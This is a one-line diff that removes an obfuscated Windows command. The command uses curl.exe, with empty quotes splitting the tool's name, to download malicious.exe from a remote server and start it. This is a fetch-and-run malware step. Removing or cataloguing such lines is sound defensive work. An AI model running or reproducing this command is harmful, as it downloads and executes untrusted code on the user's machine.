@@ -1,1 +1,0 @@
-cu""rl.exe -O http://remote.server/malicious.exe & start malicious.exe
